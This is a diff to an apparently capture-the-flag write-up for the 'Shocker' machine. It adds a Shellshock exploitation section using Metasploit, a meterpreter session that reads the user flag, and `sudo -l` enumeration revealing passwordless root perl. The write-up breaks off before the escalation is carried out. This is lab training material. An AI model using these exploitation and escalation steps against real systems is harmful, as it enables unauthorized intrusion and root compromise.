@@ -12,7 +12,10 @@ x
 ### 3. Deeper Gobuster Enumeration
 x
 
-### 4. Privilege Escalation
+### 4. Port 80 Shellshock Exploitation (Metasploit)
+x
+
+### 5. Privilege Escalation
 x
 
 # Attack
@@ -310,3 +313,33 @@ msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > exploit
 meterpreter >
 ```
 And a shell!
+
+Let's get flags.
+```
+meterpreter > pwd
+/usr/lib/cgi-bin
+meterpreter > getuid
+Server username: shelly @ Shocker (uid=1000, gid=1000, euid=1000, egid=1000)
+...
+meterpreter > pwd
+/home/shelly
+meterpreter > cat user.txt
+269772aeb3c671e933017e412063eab9
+```
+We don't have root privileges, and will have to privilege escalate to get the root flag.
+
+## 5. Privilege Escalation
+Let's do our usual quick enumeration with `sudo -l`.
+```
+meterpreter > shell 
+Process 2576 created.
+Channel 2 created.
+ 
+sudo -l
+Matching Defaults entries for shelly on Shocker:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User shelly may run the following commands on Shocker:
+    (root) NOPASSWD: /usr/bin/perl
+```
+Ooh! We can run `perl` as root. If this fails, we could probably look at SUID configurations or services or things like that.
